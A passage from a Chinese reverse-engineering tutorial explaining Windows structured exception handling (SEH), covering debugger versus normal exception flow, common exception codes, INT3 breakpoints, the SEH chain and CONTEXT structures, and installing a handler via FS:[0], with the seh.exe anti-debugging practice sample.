调试器运行时弹出的消息框"></p><p>从图48-5中弹出的消息框可以看到，它与程序正常运行时弹岀的对话框是不同的，消息内容为“检测到调试器”（我向程序中插入了一段简单的调试器检测代码）。以上练习示例的目的就在于，观察程序在正常运行与调试运行时表现出的不同行为。其实，程序在这2种形式运行下使用的异常处理方式是不同的（下面会讲解）。以上就是逆向分析中常用的“利用SEH机制的反调试技术”。</p><p>接下来详细讲解OS的异常与异常处理机制，还要仔细了解SEH具体的实现方法，以及在调试器中处理异常的方法。</p><blockquote><p>调试运行练习示例时，有时调试器不会像图48-3那样暂停，而会一直正常运行。这是因为设置了OllyDbg的选项，或者安装了某个特定插件。遇到这种情况请参考后面“设置OllyDbg选项”的内容。</p></blockquote><h1 id="48-3-OS的异常处理方法"><a href="#48-3-OS的异常处理方法" class="headerlink" title="48.3 OS的异常处理方法"></a>48.3 OS的异常处理方法</h1><p>通过前面的学习我们了解到，同一程序（seh.exe）在正常运行与调试运行时表现岀的行为动<br>作是不同的。这是由Windows OS异常处理方法的不同造成的。</p><h2 id="48-3-1-正常运行时的异常处理方法"><a href="#48-3-1-正常运行时的异常处理方法" class="headerlink" title="48.3.1 正常运行时的异常处理方法"></a>48.3.1 正常运行时的异常处理方法</h2><p>进程运行过程中若发生异常，OS会委托进程处理。若进程代码中存在具体的异常处理（如SEH异常处理器）代码，则能顺利处理相关异常，程序继续运行。但如果进程内部没有具体实现SEH，那么相关异常就无法处理，OS就会启动默认的异常处理机制，终止进程运行（参考图48-6）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321150000156.png#crop=0&crop=0&crop=1&crop=1&id=gzUoW&originHeight=334&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-6 Windows 7的默认异常处理机制"></p><h2 id="48-3-2-调试运行时的异常处理方法"><a href="#48-3-2-调试运行时的异常处理方法" class="headerlink" title="48.3.2 调试运行时的异常处理方法"></a>48.3.2 调试运行时的异常处理方法</h2><p>调试运行中发生异常时，处理方法与上面有些不同。若被调试进程内部发生异常，OS会首先把异常拋给调试进程处理。调试器几乎拥有被调试者的所有权限，它不仅可以运行、终止被调试者，还拥有被调试进程的虚拟内存、寄存器的读写权限。需要特别指岀的是，被调试者内部发生的所有异常（错误）都由调试器处理。所以调试过程中发生的所有异常（错误）都要先交由调试器管理（被调试者的SEH依据优先顺序推给调试器）。像这样，被调试者发生异常时，调试器就会暂停运行，必须采取某种措施来处理异常，完成后继续调试。遇到异常时经常采用的几种处理方法如下所示。</p><p>（1）直接修改异常：代码、寄存器、内存</p><p>被调试者发生异常时，调试器会在发生异常的代码处暂停，此时可以通过调试器直接修改有问题的代码、内存、寄存器等，排除异常后，调试器继续运行程序。</p><blockquote><p>遇到图48-3中的异常时，采用直接修改异常的方法进行如下处理。</p><ul><li>由于EAX寄存器所指的地址值错误，所以只要把EAX寄存器的值修改为有效的内存地址即可。 </li><li>由于401019地址处的代码触发了异常，使用OllyDbg的汇编（Space）或编辑（Ctrl+E）功能将相关代码修改为NOP指令，运行后也可排除异常。 </li><li>也可以使用OllyDbg的New Origin here（Ctrl+Gray *）功能改变程序的运行路径（因为无法直接修改EIP寄存器，所以需要借助该功能修改）。</li></ul></blockquote><blockquote><p>请不要随意使用这些修改方法，必须在明确知道程序错误的情形下才能使用。</p></blockquote><p>（2） 将异常抛给被调试者处理<br>如果被调试者内部存在SEH（异常处理函数）能够处理异常，那么异常通知会发送给被调试者，由被调试者自行处理。这与程序正常运行时的异常处理方式是一样的。前面的seh.exe练习示例中，使用OllyDbg中的Shift+F7&#x2F;F8&#x2F;F9命令（StepInto&#x2F;StepOver&#x2F;Run）可以直接将当前异常抛还给被调试者。</p><p>（3） OS默认的异常处理机制<br>若调试器与被调试者都无法处理（或故意不处理）当前发生的异常，则OS的默认异常处理机制会处理它，终止被调试进程，同时结束调试。</p><h1 id="48-4异常"><a href="#48-4异常" class="headerlink" title="48.4异常"></a>48.4异常</h1><p>学习异常处理前，有必要了解操作系统中定义的异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">STILL_ACTIVE(<span class="hljs-number">0x00000103</span>L)<br>EXCEPTION_ACCESS_VIOLATION(<span class="hljs-number">0xC0000005</span>L)<br>EXCEPTION_DATATYPE_MISALIGNMENT(<span class="hljs-number">0x80000002</span>L)<br>EXCEPTION_BREAKPOINT(<span class="hljs-number">0x80000003</span>L)<br>EXCEPTION_SINGLE_STEP(<span class="hljs-number">0x80000004</span>L)<br>EXCEPTION_ARRAY_BOUNDS_EXCEEDED(<span class="hljs-number">0xC000008C</span>L)<br>EXCEPTION_FLT_DENORMAL_OPERAND(<span class="hljs-number">0xC000008D</span>L)<br>EXCEPTION_FLT_DIVIDE_BY_ZERO(<span class="hljs-number">0xC000008E</span>L)<br>EXCEPTION_FLT_INEXACT_RESULT(<span class="hljs-number">0xC000008F</span>L)<br>EXCEPTION_FLT_INVALID_OPERATION(<span class="hljs-number">0xC0000090</span>L)<br>EXCEPTION_FLT_OVERFLOW(<span class="hljs-number">0xC0000091</span>L)<br>EXCEPTION_FLT_STACK_CHECK(<span class="hljs-number">0xC0000092</span>L)<br>EXCEPTION_FLT_UNDERFLOW(<span class="hljs-number">0xC0000093</span>L)<br>EXCEPTION_INT_DIVIDE_BY_ZERO(<span class="hljs-number">0xC0000094</span>L)<br>EXCEPTION_INT_OVERFLOW(<span class="hljs-number">0xC0000095</span>L)<br>EXCEPTION_PRIV_INSTRUCTION(<span class="hljs-number">0xC0000096</span>L)<br>EXCEPTION_IN_PAGE_ERROR(<span class="hljs-number">0xC0000006</span>L)<br>EXCEPTION_ILLEGAL_INSTRUCTION(<span class="hljs-number">0xC000001D</span>L)<br>EXCEPTION_NONCONTINUABLE_EXCEPTION(<span class="hljs-number">0xC0000025</span>L)<br>EXCEPTION_STACK_OVERFLOW(<span class="hljs-number">0xC00000FD</span>L)<br>EXCEPTION_INVALID_DISPOSITION(<span class="hljs-number">0xC0000026</span>L)<br>EXCEPTION_GUARD_PAGE(<span class="hljs-number">0x80000001</span>L)<br>EXCEPTION_INVALID_HANDLE(<span class="hljs-number">0xC0000008</span>L)<br>CONTROL_C_EXIT(<span class="hljs-number">0xC000013A</span>L)<br></code></pre></td></tr></table></figure><p>以上异常列表中，我们调试时会经常接触5种最具代表性的异常，接下来分别介绍（其他异常请参考MSDN）。</p><h2 id="48-4-1-EXCEPTION-ACCESS-VIOLATION（C0000005）"><a href="#48-4-1-EXCEPTION-ACCESS-VIOLATION（C0000005）" class="headerlink" title="48.4.1 EXCEPTION_ACCESS_VIOLATION（C0000005）"></a>48.4.1 EXCEPTION_ACCESS_VIOLATION（C0000005）</h2><p>试图访问不存在或不具访问权限的内存区域时，就会发生EXCEPTION_ACCESS_VIOLATION（非法访问异常，该异常最常见）。</p><blockquote><p>MOV DWORD PTR DS:[0], 1</p><p>→ 内存地址0处是尚未分配的区域。</p><p>ADD DWORD PTR DS:[401000],1</p><p>→ .text节区的起始地址401000仅具有“读”权限（无“写”权限）。</p><p>XOR DWORD PTR DS:[80000000],1234</p><p>→ 内存地址80000000属于内核区域，用户模式下无法访问。</p></blockquote><h2 id="48-4-2-EXCEPTION-BREAKPOINT（80000003）"><a href="#48-4-2-EXCEPTION-BREAKPOINT（80000003）" class="headerlink" title="48.4.2 EXCEPTION_BREAKPOINT（80000003）"></a>48.4.2 EXCEPTION_BREAKPOINT（80000003）</h2><p>在运行代码中设置断点后，CPU尝试执行该地址处的指令时，将发生EXCEPTION_BREAKPOINT异常。调试器就是利用该异常实现断点功能的。下面仔细了解实现方法。</p><p><strong>INT3</strong></p><p>设置断点命令对应的汇编指令为INT3,对应的机器指令（IA-32指令）为0xCC。CPU运行代码的过程中若遇到汇编指令INT3,则会触发EXCEPTION_BREAKPOINT异常。在OllyDbg调试器某个地址处设置好断点后，确认该地址处的指令是否真会变为INT3（0xCC）。在OllyDbg中再次打开seh.exe文件，转到401000地址处（011+0），按F2键设置好断点，如图48-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322101816624.png#crop=0&crop=0&crop=1&crop=1&id=YfpQc&originHeight=476&originWidth=925&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-7 在401000地址处设置断点"></p><p>从图48-7中可以看到，虽然401000地址处设置了断点，但是该地址处的指令并未变为INT3（汇编指令），也未由 “68” 变为“CC”（机器指令）。为什么跟前面讲的不一样呢？其实，这是OllyDbg耍的一个小花招。由于在OllyDbg中按F2键设置的断点是用户用来调试的临时断点（User Temporary Break Point）,所以不需要在调试画面中显示。在代码与内存中将用户设置的临时断点全部显示出来，反而会大大降低代码的可读性，给代码调试带来不便。换言之，<strong>实际进程内存</strong>中401000地址处的指令 “68” 已经被更改为“CC”，但是为了调试方便，OllyDbg并未将其显示出来。将进程内存转储之后可以看到更改后的CC指令，先使用PE Tools工具转储进程内存，如图48-8所示。以seh_dump.exe文件名保存转储文件后，使用Hex Editor工具打开，查看图48-7中位于401000地址处（文件偏移地址为1000）的指令，如图48-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322102118499.png#crop=0&crop=0&crop=1&crop=1&id=bMV6a&originHeight=550&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-8 使用PE Tools工具转储seh.exe进程内存"></p><blockquote><p>seh_dump.exe 的 ImageBase 为400000，所以 VA 401000对应 RVA 1000（RVA&#x3D;VAImageBase）。由于seh_dump.exe是直接由seh.exe进程内存转储而来的，所以RVA就 是RAW（文件偏移量）。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322102541906.png#crop=0&crop=0&crop=1&crop=1&id=zv6PR&originHeight=101&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>查看文件偏移1000处，可以看到机器指令CC（INT3指令-Breakpoint）。也就是说，图48-7中进程内存的实际值为0xCC,但是OllyDbg调试器在显示时先将其更改为原来的操作码 “68”，然后再显示出来。</p><p>以上就是断点内部工作原理，灵活运用这一原理能为程序调试带来很大便利。比如，使用Hex Editor工具打开PE文件，修改EP地址对应的文件偏移处的第一个字节为CC，然后运行该PE文件就会发生EXCEPTION_BREAKPOINT异常，经过OS的默认异常处理后终止运行。若在系统注册表中将默认调试器设置为OllyDbg，那么发生以上异常时OS会自动运行OllyDbg调试器，附加发生异常的进程（第八部分中将详细讲解利用这一原理调试的方法）。</p><h2 id="48-4-3-EXCEPTION-ILLEGAL-INSTRUCTION（C000001D）"><a href="#48-4-3-EXCEPTION-ILLEGAL-INSTRUCTION（C000001D）" class="headerlink" title="48.4.3 EXCEPTION_ILLEGAL_INSTRUCTION（C000001D）"></a>48.4.3 EXCEPTION_ILLEGAL_INSTRUCTION（C000001D）</h2><p>CPU遇到无法解析的指令时引发该异常。比如 “0FFF”指令在x86 CPU中未定义，CPU遇到该指令将引发EXCEPTION_ILLEGAL_INSTRUCTION异常。</p><p>下面使用OllyDbg调试器进行简单测试。首先使用OllyDbg调试器打开seh.exe，在EP代码地址处直接修改指令为0FFF，然后运行程序将引发EXCEPTION_ILLEGAL_INSTRUCTION异常，调试器暂停运行，如图48-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322102943058.png#crop=0&crop=0&crop=1&crop=1&id=xbzmY&originHeight=609&originWidth=939&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-10 EXCEPTION_ILLEGAL_INSTRUCTION异常"></p><h2 id="48-4-4-EXCEPTION-INT-DIVIDE-BY-ZERO（C0000094）"><a href="#48-4-4-EXCEPTION-INT-DIVIDE-BY-ZERO（C0000094）" class="headerlink" title="48.4.4 EXCEPTION_INT_DIVIDE_BY_ZERO（C0000094）"></a>48.4.4 EXCEPTION_INT_DIVIDE_BY_ZERO（C0000094）</h2><p>INTEGER（整数）除法运算中，若分母为0（即被0除），则引发EXCEPTION_INT_DIVIDE_BY_ZERO异常。编写应用程序时偶尔会发生该异常，分母为变量时，该变量在某个瞬间变为0,执行除法运算就会引发EXCEPTION_INT_DIVIDE_BY_ZERO异常。下面进行简单测试，首先在OllyDbg调试器中打开seh.exe，使用汇编指令（Space）在EP代码处修改代码，即图48-11粗线框中的代码，然后运行程序。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322103206146.png#crop=0&crop=0&crop=1&crop=1&id=sY5Pn&originHeight=606&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="「图48-11 EXCEPTION_INT_DIVIDE_BY_ZERO异常"></p><p>401220地址处的DIV ECX指令执行EAX&#x2F;ECX运算，然后将商保存到EAX寄存器。但由于此时ECX寄存器的值为0，即除法的分母为0，所以引发EXCEPTION_INT_DIVIDE_BY_ZERO异常，调试器暂停运行。</p><h2 id="48-4-5-EXCEPTION-SINGLE-STEP（80000004）"><a href="#48-4-5-EXCEPTION-SINGLE-STEP（80000004）" class="headerlink" title="48.4.5 EXCEPTION_SINGLE_STEP（80000004）"></a>48.4.5 EXCEPTION_SINGLE_STEP（80000004）</h2><p>Single Step（单步）的含义是执行1条指令，然后暂停。CPU进入单步模式后，每执行一条指令就会引发EXCEPTION_SINGLE_STEP异常，暂停运行。将EFLAGS寄存器的TF（Trap Flag, 陷阱标志）位设置为1后，CPU就会进入单步工作模式。</p><blockquote><p>关于陷阱标志与单步的详细说明请参考第52章。</p></blockquote><h1 id="48-5-SEH详细说明"><a href="#48-5-SEH详细说明" class="headerlink" title="48.5 SEH详细说明"></a>48.5 SEH详细说明</h1><h2 id="48-5-1-SEH-链"><a href="#48-5-1-SEH-链" class="headerlink" title="48.5.1 SEH 链"></a>48.5.1 SEH 链</h2><p>SEH以链的形式存在。第一个异常处理器中若未处理相关异常，它就会被传递到下一个异常处理器，直到得到处理。从技术层面看，SEH是由<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体组成的链表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EXCEPTION</span> <span class="hljs-title">REGISTRATION</span> <span class="hljs-title">RECORD</span></span><br><span class="hljs-class">&#123;</span><br>PEXCEPTION_REGISTRATION_RECORD Next;<br>PEXCEPTION_DISPOSITION Handler;<br>&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;<br></code></pre></td></tr></table></figure><p>Next成员是指向下一个_EXCEPTION_REGISTRATION_RECORD结构体的指针，Handler成员是异常处理函数（异常处理器）。若Next成员的值为FFFFFFFF，则表示它是链表的最后一个结点。图48-12直观形象地描述了进程SEH链的结构。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322103431686.png#crop=0&crop=0&crop=1&crop=1&id=rOfrD&originHeight=163&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-12 SEH链"></p><p>图48-12中共存在3个SEH（异常处理器），发生异常时，该异常会按照（A）→（B）→（C）的顺序依次传递，直到有异常处理器处理。</p><h2 id="48-5-2异常处理函数的定义"><a href="#48-5-2异常处理函数的定义" class="headerlink" title="48.5.2异常处理函数的定义"></a>48.5.2异常处理函数的定义</h2><p>SEH异常处理函数（SEH函数）定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">EXCEPTION_DISPOSITION _except_handler<br>( <br>    EXCEPTION_RECORD *pRecord,<br>    EXCEPTION_REGISTRATION_RECORD*pFrame,<br>    CONTEXT *pContext,<br>    PVOID pValue<br>);<br></code></pre></td></tr></table></figure><p>异常处理函数（异常处理器）接收4个参数输入，返回名为EXCEPTION_DISPOSITION的枚举类型（enum）。该异常处理函数由系统调用，是一个回调函数，系统调用它时会给出代码48-4中的4个参数，这4个参数中保存着与异常相关的信息。首先，第一个参数是指向EXCEPTION_RECORD结构体的指针，EXCEPTION_RECORD结构体的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span> &#123;</span><br>  DWORD                    ExceptionCode;<br>  DWORD                    ExceptionFlags;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span>  *<span class="hljs-title">ExceptionRecord</span>;</span><br>  PVOID                    ExceptionAddress;<br>  DWORD                    NumberParameters;<br>  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];<br>&#125; EXCEPTION_RECORD, *PEXCEPTION_RECORD;<br></code></pre></td></tr></table></figure><p>请注意该结构体中ExceptionCode与ExceptionAddress这2个成员，ExceptionCode成员用来指出<br>异常类型，ExceptionAddress成员表示发生异常的代码地址。代码48-4中异常处理函数的第三个参<br>数是指向CONTEXT结构体的指针，CONTEXT结构体的定义如下（供IA-32使用）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT</span> &#123;</span><br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// The flags values within this flag control the contents of</span><br>    <span class="hljs-comment">// a CONTEXT record.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// If the context record is used as an input parameter, then</span><br>    <span class="hljs-comment">// for each portion of the context record controlled by a flag</span><br>    <span class="hljs-comment">// whose value is set, it is assumed that that portion of the</span><br>    <span class="hljs-comment">// context record contains valid context. If the context record</span><br>    <span class="hljs-comment">// is being used to modify a threads context, then only that</span><br>    <span class="hljs-comment">// portion of the threads context will be modified.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// If the context record is used as an IN OUT parameter to capture</span><br>    <span class="hljs-comment">// the context of a thread, then only those portions of the thread&#x27;s</span><br>    <span class="hljs-comment">// context corresponding to set flags will be returned.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// The context record is never used as an OUT only parameter.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD ContextFlags;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is</span><br>    <span class="hljs-comment">// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT</span><br>    <span class="hljs-comment">// included in CONTEXT_FULL.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   Dr0;<br>    DWORD   Dr1;<br>    DWORD   Dr2;<br>    DWORD   Dr3;<br>    DWORD   Dr6;<br>    DWORD   Dr7;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// This section is specified/returned if the</span><br>    <span class="hljs-comment">// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.</span><br>    <span class="hljs-comment">//</span><br><br>    FLOATING_SAVE_AREA FloatSave;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// This section is specified/returned if the</span><br>    <span class="hljs-comment">// ContextFlags word contians the flag CONTEXT_SEGMENTS.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   SegGs;<br>    DWORD   SegFs;<br>    DWORD   SegEs;<br>    DWORD   SegDs;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// This section is specified/returned if the</span><br>    <span class="hljs-comment">// ContextFlags word contians the flag CONTEXT_INTEGER.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   Edi;<br>    DWORD   Esi;<br>    DWORD   Ebx;<br>    DWORD   Edx;<br>    DWORD   Ecx;<br>    DWORD   Eax;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// This section is specified/returned if the</span><br>    <span class="hljs-comment">// ContextFlags word contians the flag CONTEXT_CONTROL.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   Ebp;<br>    DWORD   Eip;<br>    DWORD   SegCs;              <span class="hljs-comment">// MUST BE SANITIZED</span><br>    DWORD   EFlags;             <span class="hljs-comment">// MUST BE SANITIZED</span><br>    DWORD   Esp;<br>    DWORD   SegSs;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// This section is specified/returned if the ContextFlags word</span><br>    <span class="hljs-comment">// contains the flag CONTEXT_EXTENDED_REGISTERS.</span><br>    <span class="hljs-comment">// The format and contexts are processor specific</span><br>    <span class="hljs-comment">//</span><br><br>    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];<br><br>&#125; CONTEXT;<br></code></pre></td></tr></table></figure><p>CONTEXT结构体用来备份CPU寄存器的值，因为多线程环境下需要这样做。每个线程内部都拥有1个CONTEXT结构体。CPU暂时离开当前线程去运行其他线程时，CPU寄存器的值就会保存到当前线程的CONTEXT结构体；CPU再次运行该线程时，会使用保存在CONTEXT结构体的值来覆盖CPU寄存器的值，然后从之前暂停的代码处继续执行。通过这种方式，OS可以在多线程环境下安全运行各线程。</p><blockquote><p>众所周知，多线程的实现基于CPU的时间片切分机制（Time-Slicing）。这种机制下，CPU会用一定时间（时间片）依次运行各线程，时间片极短，使多个线程看上去就像在同时运行一样（根据线程的优先级，各线程在获取CPU控制权的次数上有差异）。</p></blockquote><p>异常发生时，执行异常代码的线程就会中断运行，转而运行SEH（异常处理器&#x2F;异常处理函数），此时OS会把线程的CONTEXT结构体的指针传递给异常处理函数（异常处理器）的相应参数。代码48-6的结构体成员中有1个Eip成员（偏移量：B8）。在异常处理函数中将参数传递过来的CONTEXT.Eip设置为其他地址，然后返回异常处理函数。这样，之前暂停的线程会执行新设置的EIP地址处的代码（反调试中经常采用这一技术，练习示例seh.exe中也采用了该技术，后面会详细分析）。在代码48-4中可以看到异常处理函数的返回值为EXCEPTION_DISPOSITION枚举类型，下面了解一下该类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">EXCEPTION_DISPOSITION</span></span><br><span class="hljs-class">&#123;</span><br>ExceptionContinueExecution = <span class="hljs-number">0</span>,<span class="hljs-comment">// 继续执行代码</span><br>ExceptionContinueSearch = <span class="hljs-number">1</span>,<span class="hljs-comment">// 运行下一个异常处理器</span><br>ExceptionNestedException = <span class="hljs-number">2</span>,<span class="hljs-comment">// 在OS内部使用</span><br>ExceptionCollidedUnwind = <span class="hljs-number">3</span><span class="hljs-comment">// 在OS内部使用</span><br>&#125; EXCEPTION_DISPOSITION;<br></code></pre></td></tr></table></figure><p>异常处理器处理异常后会返回ExceptionContinueExecution（0）,从发生异常的代码处继续运行。若当前异常处理器无法处理异常，则返回ExceptionContinueSearch（1），将异常派送到SEH链的下一个异常处理器。</p><blockquote><p>我们在后面会调试seh.exe的异常处理函数（异常处理器）来进一步了解其工作原理。</p></blockquote><h2 id="48-5-3-TEB-NtTib-ExceptionList"><a href="#48-5-3-TEB-NtTib-ExceptionList" class="headerlink" title="48.5.3 TEB.NtTib.ExceptionList"></a>48.5.3 TEB.NtTib.ExceptionList</h2><p>通过TTB结构体的NtTib成员可以很容易地访问进程的SEH链，方法非常简单。</p><p>如图48-13所示，TEB.NtTib.ExceptionList成员是TEB结构体的第一个成员。FS段寄存器指向段内存的起始地址，TEB结构体即位于此，所以通过下列公式可以轻松获取TEB.NtTib.ExceptionListd的地址。</p><p><img src="https://g.yuque.com/gr/latex?TEB.NtTib.ExceptionList=FS:%5B0%5D%0A#card=math&code=TEB.NtTib.ExceptionList%3DFS%3A%5B0%5D%0A&id=skZgF"></p><blockquote><p>关于TEB结构体的详细说明请参考第46章。</p></blockquote><h2 id="48-5-4-SEH安装方法"><a href="#48-5-4-SEH安装方法" class="headerlink" title="48.5.4 SEH安装方法"></a>48.5.4 SEH安装方法</h2><p>在C语言中使用<code>__try、__except、 __finally</code>关键字就可以很容易地向代码添加SEH。在汇编<br>语言中添加SEH的方法更加简单，如代码48-8所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">PUSH @MyHandler; 异常处理器<br>PUSH DWORD PTR FS:[<span class="hljs-number">0</span>]; Head of SEH Linked List<br>MOV DWORD PTR FS:[<span class="hljs-number">0</span>],ESP; 添加链表<br></code></pre></td></tr></table></figure><p>看代码48-8就容易理解了。“在程序代码中安装SEH”就是指，将自身的异常处理器添加到已有的SEH链。从技术层面讲，就是将自身的EXCEPTION_REGISTRATION_RECORD结构体链接到EXCEPTION_REGISTRATION_RECORD结构体链表。前面出现的seh.exe程序就是采用上述汇编代码添加的SEH，下面再次调试seh.exe程序以进一步了解添加SEH的方法及其工作原理。</p><h1 id="48-6-SEH练习示例-2（seh-exe）"><a href="#48-6-SEH练习示例-2（seh-exe）" class="headerlink" title="48.6 SEH练习示例 #2（seh.exe）"></a>48.6 SEH练习示例 #2（seh.exe）</h1><p>首先使用OllyDbg调试器打开seh.exe程序，运行到401000地址处（此处为seh.exe程序的main()函数）。我编写的全部代码如图48-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322110337011.png#crop=0&crop=0&crop=1&crop=1&id=EMG54&originHeight=763&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-14 seh.exe代码"></p><p>位于401000、401005、40100C地址处的3条指令与“SEH安装方法”中讲的汇编指令是一样的。从图48-14中可以看到，新添加的异常处理器就是位于40105A地址处的异常处理函数。</p><h2 id="48-6-1-查看SEH链"><a href="#48-6-1-查看SEH链" class="headerlink" title="48.6.1 查看SEH链"></a>48.6.1 查看SEH链</h2><p>继续运行代码到401005地址处，查看FS:[0]的值，其值就是SEH链的起始地址，如图48-15所示。</p><p><img 